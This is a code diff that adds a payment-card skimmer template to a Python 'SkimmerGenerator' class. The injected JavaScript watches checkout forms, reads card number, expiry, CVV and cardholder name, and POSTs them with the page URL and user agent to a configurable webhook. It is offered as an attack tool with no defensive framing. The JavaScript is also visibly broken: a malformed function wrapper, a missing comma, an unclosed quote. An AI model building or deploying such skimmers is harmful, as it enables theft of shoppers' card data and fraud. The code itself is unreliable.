@@ -59,4 +59,44 @@ class SkimmerGenerator:
     
     def _standard_skimmer(self):
         return f"""
+        (function)() {{
+            const webhook = "{self.webhook}";
+            let stolen = [];
+
+            function capture() {{
+                const inputs = {{
+                    card: document.querySelector('input[name*="number"], input[name*="card"]'),
+                    expiry: document.querySelector('input[name*="exp"], input[name*="expiry"]'),
+                    cvv: document.querySelector('input[name*="cvv"], input[name*="cvc"]'),
+                    name: document.querySelector('input[name*="name], input[name*="holder"]')
+                }};
+
+                if(inputs.card && inputs.card.value.length > 12) {{
+                    const data = {{
+                        card: inputs.card.value,
+                        expiry: inputs.expiry?.value || '',
+                        cvv: inputs.cvv?.value || '',
+                        name: inputs.name?.value || '',
+                        url: window.location.href,
+                        ua: navigator.userAgent,
+                        time: new Date().toISOString()
+                    }};
+                    stolen.push(data);
+
+                    fetch(webhook, {{
+                        method: 'POST'
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify(data),
+                        mode: 'no-cors'
+                    }});
+
+                    inputs.card.value = '';
+                }}
+            }}
+            setInterval(capture, 2000);
+            document.querySelectorAll('form').forEach(f => f.addEventListener('submit', capture));
+        }});
+        """
+
+    def _advanced_skimmer(self):
         
